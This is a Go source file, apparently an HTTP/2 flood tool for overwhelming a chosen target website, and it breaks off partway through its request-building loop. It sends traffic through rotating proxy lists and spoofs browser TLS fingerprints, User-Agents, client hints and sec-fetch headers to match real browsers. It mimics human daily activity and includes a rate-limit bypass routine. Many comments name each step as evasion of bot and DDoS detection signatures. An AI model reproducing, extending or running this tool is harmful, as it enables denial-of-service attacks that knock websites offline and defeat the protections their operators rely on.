package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
	tls "github.com/bogdanfinn/utls"

	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/mem"
)

var (
	statuses = make(map[string]int)
	mu       sync.Mutex

	connections, requests, responses, errors int32
	totalRequests, successCount, errorCount, bytesReceived int64

	target    string
	duration  int
	rps       int
	conns     int
	proxyFile string

	randpath      bool
	randrate      bool
	ratelimitOption bool
	closeOption bool
	proxyAuth bool
	debugmode int
	cookie    string
	useragent string
	proxies   []*ProxyInfo
	proxyIP string
	limit int
	floodOption bool
	useHpack    bool
	verifyProxies    bool
	originRaw        string
	cpuLimit int
	rotateUserAgent bool  // New flag to control User-Agent rotation
)

// HTTP/2 Framer สำหรับ raw frame manipulation
type Framer struct {
	enc *hpack.Encoder
	buf *bytes.Buffer
	id  uint32
}

func (f *Framer) init() {
	f.buf = new(bytes.Buffer)
	f.enc = hpack.NewEncoder(f.buf)
	f.enc.SetMaxDynamicTableSize(65536)
	f.id = 1
}

func (f *Framer) request(headers [][2]string) ([]byte, error) {
	f.buf.Reset()
	for _, header := range headers {
		err := f.enc.WriteField(hpack.HeaderField{Name: header[0], Value: header[1]})
				if err != nil {
			return nil, fmt.Errorf("failed to hpack header")
		}
	}
	payload := new(bytes.Buffer)
	var length [4]byte
	binary.BigEndian.PutUint32(length[:], uint32(len(f.buf.Bytes())))
	payload.Write(length[1:])
	payload.WriteByte(0x01)
	payload.WriteByte(0x05)
	var streamID [4]byte
	binary.BigEndian.PutUint32(streamID[:], f.id)
	payload.Write(streamID[:])
	payload.Write(f.buf.Bytes())
	atomic.AddUint32(&f.id, 2)
	return payload.Bytes(), nil
}

// Proxy structure for connection management with anti-signature #69 attributes
type ProxyInfo struct {
	Addr string
	Auth string
	SessionID string
	// Anti-signature #69: diversification per proxy เพื่อหลีกเลี่ยง pattern detection
	ProfileIndex int     // Browser profile index for this proxy
	LangIndex int        // Accept-Language index for this proxy
	RateFactor float64   // Request rate variation (0.5x - 1.5x)
	ParamKey string      // Cache-busting parameter key
	TimingProfile int    // Timing behavior profile (0-2)
	VolumeProfile int    // Request volume profile (0-2)  
	SessionStartTime time.Time // เพื่อคำนวณ session age
	// Session state management (anti-pattern #3 & anti-signature #69)
	SessionCookies map[string]string // เก็บ cookies สำหรับ session นี้
	LastUserAgent string // เก็บ User-Agent ล่าสุดเพื่อ consistency
	RequestCount int64 // จำนวน request ที่ส่งไปแล้ว
	ErrorCount int64   // จำนวน error ที่เกิดขึ้น
	CurrentTLSFingerprint tls.ClientHelloID // Current TLS fingerprint to match User-Agent
}

// Generate random string for session IDs
func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	sr := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[sr.Intn(len(charset))]
	}
	return string(b)
}

// Parse proxies with authentication support
func parseProxiesAdvanced(filename string) ([]*ProxyInfo, error) {
	fileData, err := os.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("file not found")
	}
	proxiesList := strings.Split(strings.ReplaceAll(strings.TrimSpace(string(fileData)), "\r\n", "\n"), "\n")
	if len(proxiesList) < 1 {
		return nil, fmt.Errorf("failed to parse proxies")
	}
	
	var result []*ProxyInfo
	num := 0
	var hk string
	
	for _, proxy := range proxiesList {
		if num%25 == 0 {
			// Anti-Signature #37: Use only standard browser-compatible session identifiers
			// Avoid any unusual patterns in session names
			standardSessions := []string{"JSESSIONID", "PHPSESSID", "ASP.NET_SessionId", "session_id"}
			hk = standardSessions[rand.Intn(len(standardSessions))]
		}
		p := strings.Split(proxy, ":")
		if len(p) == 2 {
			// Anti-Signature #69: Generate realistic session ID using new utils
			sessionValue := GenerateRealisticSessionID()
			result = append(result, &ProxyInfo{
				Addr:      proxy,
				Auth:      "",
				SessionID: fmt.Sprintf("%s:%s", hk, sessionValue),
				// Anti-signature #69: แต่ละ proxy มี characteristics แตกต่างกัน
				ProfileIndex: rand.Intn(10),  // 0-9 browser profiles (10 total profiles with matched TLS fingerprints)
				LangIndex: rand.Intn(13),     // 0-12 accept-language options (13 total)
				RateFactor: 0.5 + rand.Float64(), // 0.5x - 1.5x rate variation
				ParamKey: []string{"v","t","_","cache"}[rand.Intn(4)], // Anti-Signature #37: Only standard params
				TimingProfile: rand.Intn(3), // 0=conservative, 1=moderate, 2=aggressive  
				VolumeProfile: rand.Intn(3), // 0=low, 1=medium, 2=high volume
				SessionStartTime: time.Now(),
				// Initialize session state
				SessionCookies: make(map[string]string),
				RequestCount: 0,
				ErrorCount: 0,
			})
			num++
		} else if len(p) == 4 {
			sessionValue := GenerateRealisticSessionID()
			result = append(result, &ProxyInfo{
				Addr:      fmt.Sprintf("%s:%s", p[0], p[1]),
				Auth:      base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s:%s", p[2], p[3]))),
				SessionID: fmt.Sprintf("%s:%s", hk, sessionValue),
				// Anti-signature #69: แต่ละ proxy มี characteristics แตกต่างกัน
				ProfileIndex: rand.Intn(9),  // 0-8 browser profiles (9 total profiles with matched TLS fingerprints)
				LangIndex: rand.Intn(5), 
				RateFactor: 0.5 + rand.Float64(),
				ParamKey: []string{"v","t","_","cache"}[rand.Intn(4)], // Anti-Signature #37: Only standard params
				TimingProfile: rand.Intn(3),
				VolumeProfile: rand.Intn(3),
				SessionStartTime: time.Now(),
				// Initialize session state
				SessionCookies: make(map[string]string),
				RequestCount: 0,
				ErrorCount: 0,
			})
			num++
		}
	}
	return result, nil
}

// Initialize raw TCP connection through proxy
func initConnection(proxy *ProxyInfo, host string, port int) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxy.Addr, time.Duration(5)*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connection to proxy failed")
	}
	
	// Set connection deadline
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	
	req := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n", host, port, host, port)
	if proxy.Auth != "" {
		req += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", proxy.Auth)
	}
	req += "\r\n"
	
	_, err = conn.Write([]byte(req))
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to send CONNECT request")
	}
	
	buf := make([]byte, 1460)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to read data from socket")
	}
	
	if !strings.Contains(string(buf[:n]), " 200 ") {
		conn.Close()
		return nil, fmt.Errorf("bad http answer code")
	}
	
	// Remove deadline for actual usage
	conn.SetDeadline(time.Time{})
	return conn, nil
}

// Establish custom TLS connection with dynamic fingerprinting rotation (anti-pattern #3)
func establishTls(hostname string, conn *net.Conn, proxyInfo *ProxyInfo) (tls.UConn, error) {
	conf := &tls.Config{ServerName: hostname, InsecureSkipVerify: true}
	
	// Dynamic TLS fingerprint selection เพื่อหลีกเลี่ยง uniform patterns
	var clientHello tls.ClientHelloID
	
	// CRITICAL: Use TLS fingerprint that matches the User-Agent to avoid detection
	if proxyInfo != nil && proxyInfo.CurrentTLSFingerprint.Str() != "" {
		// Use the TLS fingerprint that matches the current User-Agent
		clientHello = proxyInfo.CurrentTLSFingerprint
		
		// Anti-bot session evolution with natural browser update patterns
		sessionMinutes := int(time.Since(proxyInfo.SessionStartTime).Minutes())
		// Organic browser updates (rare but realistic)
		if sessionMinutes > 30 && sessionMinutes%45 == 0 {
			// 3% chance every 45 minutes of "browser update" (more realistic)
			if rand.Float32() < 0.03 {
				// Natural browser upgrade paths based on fingerprint string
				currentFingerprintStr := clientHello.Str()
				if strings.Contains(currentFingerprintStr, "Chrome 106") {
					clientHello = tls.HelloChrome_112 // Incremental Chrome update
					proxyInfo.CurrentTLSFingerprint = clientHello
				} else if strings.Contains(currentFingerprintStr, "Chrome 112") {
					clientHello = tls.HelloChrome_120 // Chrome auto-update
					proxyInfo.CurrentTLSFingerprint = clientHello
				} else if strings.Contains(currentFingerprintStr, "Firefox 105") {
					clientHello = tls.HelloFirefox_120 // Firefox update
					proxyInfo.CurrentTLSFingerprint = clientHello
				}
			}
		}
	} else {
		// Fallback with available legitimate fingerprints (should rarely happen)
		legitimateFingerprints := []tls.ClientHelloID{
			tls.HelloChrome_120, tls.HelloChrome_112, tls.HelloChrome_106,
			tls.HelloFirefox_120, tls.HelloFirefox_105,
			tls.HelloSafari_16_0,
		}
		clientHello = legitimateFingerprints[rand.Intn(len(legitimateFingerprints))]
		
		// Store for consistency if proxyInfo exists
		if proxyInfo != nil {
			proxyInfo.CurrentTLSFingerprint = clientHello
		}
	}
	
	wConn := tls.UClient(*conn, conf, clientHello, false, false)
	if err := wConn.Handshake(); err != nil {
		return tls.UConn{}, fmt.Errorf("failed to handshake")
	}
	return *wConn, nil
}

func Ratelimit(parsed *url.URL, proxy *ProxyInfo, timeout int) {
	timeout++
	ratelimit_timeout := timeout
	proxyAddr := ""
	if proxy != nil {
		proxyAddr = proxy.Addr
	}
	for {
		if timeout <= 0 {
			if debugmode > 1 {
				fmt.Printf("[H2C] | (%s) ratelimit bypassed [%d/%d]\n", proxyAddr, timeout, ratelimit_timeout)
			}
			startRawTLS(parsed, proxy)
			return
		}
		if debugmode > 1 {
			fmt.Printf("[H2C] | (%s) ratelimit [%d/%d]\n", proxyAddr, timeout, ratelimit_timeout)
		}
		time.Sleep(1 * time.Second)
		timeout--
	}
}



func FormatProxyURL(raw string) string {
	if raw == "" {
		return raw
	}
	if strings.HasPrefix(raw, "http://") || strings.HasPrefix(raw, "https://") {
		return raw
	}
	if proxyAuth {
		if strings.Contains(raw, "@") {
			return "http://" + raw
		}
		if strings.Count(raw, ":") == 3 {
			parts := strings.Split(raw, ":")
			return fmt.Sprintf("http://%s:%s@%s:%s", parts[0], parts[1], parts[2], parts[3])
		}
	}
	return "http://" + raw
}

func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
	atomic.AddInt32(&connections, 1)
	defer atomic.AddInt32(&connections, -1)

	scheme := "https"
	if parsed.Scheme == "http" {
		scheme = "http"
	}
	
	// Anti-correlation delay: Optimized for high-speed requests (anti-signature #69)
	if proxyInfo != nil {
		// Fast connection with minimal correlation delay
		proxyHash := 0
		for _, b := range []byte(proxyInfo.Addr) {
			proxyHash = proxyHash*31 + int(b)
		}
		// Reduced correlation delay: 10-60ms instead of 500-2500ms
		correlationDelay := time.Duration((proxyHash%50)+10) * time.Millisecond
		time.Sleep(correlationDelay)
	}
	
	// Extract hostname and port
	hostname := parsed.Hostname()
	port := 443
	if parsed.Scheme == "http" {
		port = 80
	}
	if parsed.Port() != "" {
		if p, err := strconv.Atoi(parsed.Port()); err == nil {
			port = p
		}
	}
	
		// Anti-Signature #69: Enhanced browser profiles with diverse legitimate signatures
		// CRITICAL: User-Agent MUST match available TLS fingerprints to avoid detection
		browserProfiles := []struct {
			userAgent       string
			secChUA         string
			secChUAPlatform string
			isFirefox       bool
			isSafari        bool
			isEdge          bool
			acceptEncoding  string
			acceptValue     string
			platform        string
			tlsFingerprint  tls.ClientHelloID // Match TLS fingerprint to User-Agent
		}{
			// Chrome 120 Windows - matches HelloChrome_120
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
				"\"Windows\"", false, false, false,
				"gzip, deflate, br, zstd",  // CRITICAL: Chrome MUST include 'br' for Brotli
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"Windows NT 10.0; Win64; x64",
				tls.HelloChrome_120,
			},
			// Chrome 120 macOS - matches HelloChrome_120
			{
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
				"\"macOS\"", false, false, false,
				"gzip, deflate, br, zstd",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"Macintosh; Intel Mac OS X 10_15_7",
				tls.HelloChrome_120,
			},
			// Chrome 112 Windows - matches HelloChrome_112
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
				"\"Google Chrome\";v=\"112\", \"Chromium\";v=\"112\", \"Not=A?Brand\";v=\"24\"",
				"\"Windows\"", false, false, false,
				"gzip, deflate, br",  // CRITICAL: Chrome MUST include 'br' for Brotli
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"Windows NT 10.0; Win64; x64",
				tls.HelloChrome_112,
			},
			// Chrome 106 macOS - matches HelloChrome_106
			{
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
				"\"Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99\"",
				"\"macOS\"", false, false, false,
				"gzip, deflate, br",  // CRITICAL: Chrome MUST include 'br' for Brotli
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"Macintosh; Intel Mac OS X 10_15_7",
				tls.HelloChrome_106,
			},
			// Firefox 120 Windows - matches HelloFirefox_120
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
				"", "", true, false, false,
				"gzip, deflate, br",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
				"Windows NT 10.0; Win64; x64",
				tls.HelloFirefox_120,
			},
			// Firefox 105 macOS - matches HelloFirefox_105
			{
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
				"", "", true, false, false,
				"gzip, deflate, br",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
				"Macintosh; Intel Mac OS X 10.15",
				tls.HelloFirefox_105,
			},
			// Safari 16.0 - matches HelloSafari_16_0
			{
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
				"", "\"macOS\"", false, true, false,
				"gzip, deflate, br",
				"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Macintosh; Intel Mac OS X 10_15_7",
				tls.HelloSafari_16_0,
			},
			// Chrome 120 Linux - matches HelloChrome_120
			{
				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
				"\"Linux\"", false, false, false,
				"gzip, deflate, br, zstd",  // CRITICAL: Chrome MUST include 'br' for Brotli
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"X11; Linux x86_64",
				tls.HelloChrome_120,
			},
			// Chrome 112 Android Mobile - matches HelloChrome_112
			{
				"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
				"\"Google Chrome\";v=\"112\", \"Chromium\";v=\"112\", \"Not=A?Brand\";v=\"24\"",
				"\"Android\"", false, false, false,
				"gzip, deflate, br",  // CRITICAL: Chrome MUST include 'br' for Brotli
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"Linux; Android 10",
				tls.HelloChrome_112,
			},
			// Add Edge browser profiles to increase diversity
			// Edge 120 Windows - matches HelloChrome_120 (Edge uses Chrome engine)
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
				"\"Windows\"", false, false, true,  // isEdge = true
				"gzip, deflate, br, zstd",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"Windows NT 10.0; Win64; x64",
				tls.HelloChrome_120,  // Edge uses Chrome TLS
			},
		}
	
		// Anti-Signature #69: More diverse and realistic Accept-Language patterns
	acceptLanguages := []string{
		"en-US,en;q=0.9", // US English (most common)
		"en-GB,en-US;q=0.9,en;q=0.8", // UK English
		"en-US,en;q=0.5", // Lower preference variant
		"zh-CN,zh;q=0.9,en;q=0.8", // Chinese (common in real traffic)
		"es-ES,es;q=0.9,en;q=0.8", // Spanish
		"ja,en-US;q=0.9,en;q=0.8", // Japanese
		"de-DE,de;q=0.9,en;q=0.8", // German
		"fr-FR,fr;q=0.9,en;q=0.8", // French
		"ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7", // Korean
		"pt-BR,pt;q=0.9,en;q=0.8", // Portuguese Brazil
		"ru-RU,ru;q=0.9,en;q=0.8", // Russian
		"ar,en;q=0.9", // Arabic
		"hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7", // Hindi
	}
	
	// Advanced session management กับ organic behavior simulation (anti-signature #69)
	sessionAge := 0
	maxSessionAge := RandomInt(50, 200)
	
	// Dynamic session characteristics ที่เปลี่ยนแปลงตามเวลา
	var sessionRequests int64 = 0
	var sessionErrors int64 = 0
	
	// Organic traffic patterns - จำลองพฤติกรรมมนุษย์จริง
	dailyPatterns := []struct {
		hour int
		activityMultiplier float64
		pauseProbability float32
	}{
		{0, 0.1, 0.9},   // กลางคืน - activity น้อย, pause เยอะ
		{1, 0.05, 0.95},
		{2, 0.03, 0.97},
		{6, 0.3, 0.7},   // เช้า - เริ่มมี activity
		{8, 0.8, 0.3},   // เช้าทำงาน - activity สูง
		{12, 1.0, 0.2},  // เที่ยง - peak activity
		{14, 0.9, 0.3},  // บ่าย - activity สูง
		{18, 0.7, 0.4},  // เย็น - ลดลง
		{22, 0.4, 0.6},  // ค่ำ - activity ปานกลาง
	}
	
	currentHour := time.Now().Hour()
	var currentPattern struct {
		hour int
		activityMultiplier float64
		pauseProbability float32
	}
	
	// หา pattern ที่ใกล้เคียงกับเวลาปัจจุบัน
	for _, pattern := range dailyPatterns {
		if currentHour >= pattern.hour {
			currentPattern = pattern
		}
	}
	
	for {
		sessionAge++
		
		// Anti-Signature #69: Generate realistic headers with proper proxy consistency
		browserProfile := browserProfiles[rand.Intn(len(browserProfiles))]
		fmt.Printf("[DEBUG] Initial browser profile selected: %s\n", browserProfile.userAgent)
		acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
		
		// Platform consistency check - ensure User-Agent matches Accept-Language geography
		if strings.Contains(acceptLang, "zh-CN") && rand.Float32() < 0.7 {
			// Chinese users more likely to use specific browsers
			for i, profile := range browserProfiles {
				if strings.Contains(profile.userAgent, "Chrome") && strings.Contains(profile.platform, "Windows") {
					browserProfile = browserProfiles[i]
					break
				}
			}
		} else if strings.Contains(acceptLang, "ja") && rand.Float32() < 0.6 {
			// Japanese users often use Chrome or Safari
			for i, profile := range browserProfiles {
				if profile.isSafari || strings.Contains(profile.userAgent, "Chrome") {
					browserProfile = browserProfiles[i]
					break
				}
			}
		}
		
		// Override ด้วย proxy-specific attributes เพื่อสร้างความสอดคล้องใน proxy แต่หลากหลายระหว่าง proxy
		if proxyInfo != nil {
			fmt.Printf("[DEBUG] Proxy override - ProfileIndex: %d, RequestCount: %d\n", proxyInfo.ProfileIndex, proxyInfo.RequestCount)
			
			if rotateUserAgent {
				// When rotation is enabled, select a random profile instead of using fixed ProfileIndex
				profileIdx := rand.Intn(len(browserProfiles))
				browserProfile = browserProfiles[profileIdx]
				fmt.Printf("[DEBUG] Random profile selected (rotation enabled): %s\n", browserProfile.userAgent)
			} else {
				// ใช้ modulo เพื่อให้ ProfileIndex อยู่ในช่วงที่ถูกต้อง
				profileIdx := proxyInfo.ProfileIndex % len(browserProfiles)
				browserProfile = browserProfiles[profileIdx]
				fmt.Printf("[DEBUG] Proxy profile selected: %s\n", browserProfile.userAgent)
			}
			
			langIdx := proxyInfo.LangIndex % len(acceptLanguages)
			acceptLang = acceptLanguages[langIdx]
			
			// Session consistency - ใช้ User-Agent เดิมถ้าเคยใช้แล้ว (anti-pattern #3)
			if !rotateUserAgent && proxyInfo.LastUserAgent != "" && proxyInfo.RequestCount > 0 {
				fmt.Printf("[DEBUG] Session consistency - Using previous User-Agent: %s\n", proxyInfo.LastUserAgent)
				// Find matching profile for stored User-Agent
				foundProfile := false
				for i := range browserProfiles {
					if browserProfiles[i].userAgent == proxyInfo.LastUserAgent {
						browserProfile = browserProfiles[i]
						foundProfile = true
						break
					}
				}
				
				// If stored UA not found, use current profile but update stored UA
				if !foundProfile {
					proxyInfo.LastUserAgent = browserProfile.userAgent
				}
			} else {
				// First request or rotation enabled - บันทึก User-Agent ไว้
				if rotateUserAgent {
					fmt.Printf("[DEBUG] User-Agent rotation enabled - Using new User-Agent\n")
				}
				proxyInfo.LastUserAgent = browserProfile.userAgent
			}
			
			// CRITICAL FIX: ALWAYS store TLS fingerprint that matches the User-Agent
			// This prevents pattern #6 detection where TLS doesn't match claimed browser
			proxyInfo.CurrentTLSFingerprint = browserProfile.tlsFingerprint
		}
		
		// CRITICAL FIX: Realistic sec-fetch headers to avoid pattern #6 detection
		var secFetchSite, secFetchMode, secFetchUser, secFetchDest string
		
		// Track request number per proxy session for realistic flow
		var requestNumInSession int
		if proxyInfo != nil {
			requestNumInSession = int(proxyInfo.RequestCount % 20)
		} else {
			requestNumInSession = int(sessionRequests % 20)
		}
		
		// CRITICAL: First navigation MUST have Sec-Fetch-Site: none
		if requestNumInSession == 0 { // First request - initial page load
			secFetchSite = "none"      // MUST be none for initial navigation
			secFetchMode = "navigate"
			secFetchUser = "?1"
			secFetchDest = "document"
		} else if requestNumInSession < 5 { // Early requests - page resources
			// Resources loaded from same origin (CSS, JS, images)
			secFetchSite = "same-origin" // Resources from same domain
			
			// Determine resource type
			resourceTypes := []struct{
				mode string
				dest string
				user string
				weight float32
			}{
				{"no-cors", "script", "?0", 0.3},  // JS files
				{"no-cors", "style", "?0", 0.25},  // CSS files
				{"no-cors", "image", "?0", 0.25},  // Images
				{"cors", "empty", "?0", 0.15},     // AJAX/Fetch
				{"navigate", "iframe", "?1", 0.05}, // Iframes
			}
			
			rnd := rand.Float32()
			var cumWeight float32 = 0
			for _, rt := range resourceTypes {
				cumWeight += rt.weight
				if rnd < cumWeight {
					secFetchMode = rt.mode
					secFetchDest = rt.dest
					secFetchUser = rt.user
					break
				}
			}
		} else { // Later requests - mixed behavior
			// Realistic site values for established session
			siteProbs := []struct{
				site string
				weight float32
			}{
				{"same-origin", 0.7},  // Most requests stay on same domain
				{"same-site", 0.2},    // Some subdomain/cookie sharing
				{"cross-site", 0.1},   // External resources (CDN, analytics)
			}
			
			rnd := rand.Float32()
			var cumWeight float32 = 0
			for _, sp := range siteProbs {
				cumWeight += sp.weight
				if rnd < cumWeight {
					secFetchSite = sp.site
					break
				}
			}
			
			// Mode based on site
			if secFetchSite == "cross-site" {
				// Cross-site is usually no-cors for resources
				secFetchMode = "no-cors"
				secFetchUser = "?0"
				secFetchDest = "script" // Often external JS
			} else {
				// Same-origin/same-site mixed behavior
				if rand.Float32() < 0.6 {
					secFetchMode = "cors"
					secFetchUser = "?0"
					secFetchDest = "empty" // AJAX
				} else if rand.Float32() < 0.8 {
					secFetchMode = "no-cors"
					secFetchUser = "?0"
					dests := []string{"image", "script", "style"}
					secFetchDest = dests[rand.Intn(len(dests))]
				} else {
					secFetchMode = "navigate"
					secFetchUser = "?1"
					secFetchDest = "document" // Navigation to new page
				}
			}
		}
		
		// Dynamic path with randomization
		path := parsed.Path
		if path == "" {
			path = "/"
		}
		// Anti-Signature #37: Fix unusual URI paths - avoid any suspicious patterns
		if strings.Contains(path, "%RAND%") {
			// Never use %RAND% or similar patterns - always use standard parameters
			path = strings.Replace(path, "%RAND%", "", -1) // Remove it entirely
		}
		
		// Remove any double slashes or suspicious path patterns
		for strings.Contains(path, "//") {
			path = strings.Replace(path, "//", "/", -1)
		}
		
		// Remove any ../ patterns (directory traversal attempts)
		path = strings.Replace(path, "../", "", -1)
		path = strings.Replace(path, "..\\", "", -1)
		path = strings.Replace(path, "%2e%2e", "", -1)
		path = strings.Replace(path, "%2E%2E", "", -1)
		
		// Remove any null bytes or suspicious encoding
		path = strings.Replace(path, "%00", "", -1)
		
		// Ensure path doesn't have suspicious characters
		if strings.ContainsAny(path, "<>{}[]|\\^") {
			// Clean suspicious characters from path
			for _, char := range "<>{}[]|\\^" {
				path = strings.Replace(path, string(char), "", -1)
			}
		}
		if randpath {
			// Anti-Signature #37: Use only standard, legitimate query parameters
			// Avoid any patterns that might look suspicious
			var cacheBuster string
			
			// Use only very standard cache-busting patterns
			if rand.Float32() < 0.8 {
				// Timestamp-based (most common and legitimate)
				cacheBuster = fmt.Sprintf("t=%d", time.Now().Unix())
			} else {
				// Simple version number (also standard)
				cacheBuster = fmt.Sprintf("v=%d", rand.Intn(999)+1)
			}
			
			// Only add if path doesn't already have too many parameters
			if strings.Count(path, "&") < 3 { // Avoid suspiciously long query strings
				if strings.Contains(path, "?") {
					path += "&" + cacheBuster
				} else {
					path += "?" + cacheBuster
				}
			}
		}
		
		// สร้าง headers ที่สอดคล้องกับ browser profile (เพื่อหลีกเลี่ยง signature #17)
		// CRITICAL: Ensure Host/authority header is NEVER empty (Signature #37 detection)
		authority := parsed.Host
		if authority == "" {
			// This should never happen, but ensure we have a valid host
			authority = hostname
			if port != 80 && port != 443 {
				authority = fmt.Sprintf("%s:%d", hostname, port)
			}
		}
		
		// CRITICAL: Validate authority doesn't contain suspicious characters
		if strings.ContainsAny(authority, "<>\"';&#{}[]|\\^") {
			// Clean the authority to avoid detection
			authority = hostname
			if port != 80 && port != 443 {
				authority = fmt.Sprintf("%s:%d", hostname, port)
			}
		}
		
		h2_headers := [][2]string{
			{":method", "GET"},
			{":authority", authority},
			{":scheme", scheme},
			{":path", path},
		}
		
		// CRITICAL FIX: Add Chrome Client Hints headers to avoid pattern #6 detection
		// Chrome/Edge MUST have these headers or will be flagged as fake
		if !browserProfile.isFirefox && !browserProfile.isSafari {
			// Validate sec-ch-ua is not empty
			if browserProfile.secChUA != "" {
				h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
			} else {
				// Fallback for Chrome 120 if empty
				h2_headers = append(h2_headers, [2]string{"sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`})
			}
			h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
			
			// Validate platform is not empty
			if browserProfile.secChUAPlatform != "" {
				h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
			} else {
				// Fallback based on User-Agent
				if strings.Contains(browserProfile.userAgent, "Windows") {
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", `"Windows"`})
				} else if strings.Contains(browserProfile.userAgent, "Mac") {
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", `"macOS"`})
				} else {
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", `"Linux"`})
				}
			}
		}
		
		// CRITICAL FIX: Headers MUST be in correct browser order to avoid pattern #6 detection
		// Chrome/Edge order: upgrade-insecure-requests, user-agent, accept, sec-fetch-*, accept-encoding, accept-language
		
		// Validate and prepare User-Agent
		userAgent := browserProfile.userAgent
		if userAgent == "" {
			// Fallback to standard Chrome User-Agent if empty
			userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
		}
		
		// CRITICAL: Validate User-Agent doesn't contain suspicious characters
		if strings.ContainsAny(userAgent, "<>\"';&#") {
			// Use safe default if corrupted
			userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
		}
		
		// 1. Upgrade-Insecure-Requests (sent by most browsers for document requests)
		if secFetchDest == "document" {
			h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
		}
		
		// 2. User-Agent
		fmt.Printf("[DEBUG] Selected User-Agent: %s\n", userAgent)
		h2_headers = append(h2_headers, [2]string{"user-agent", userAgent})
		
		// 3. Accept
		acceptValue := browserProfile.acceptValue
		if acceptValue == "" || strings.Contains(acceptValue, "/dev/null") {
			// Use standard accept value
			acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
		}
		h2_headers = append(h2_headers, [2]string{"accept", acceptValue})
		
		// CRITICAL FIX: Sec-Fetch headers for Chrome/Edge (required to avoid detection)
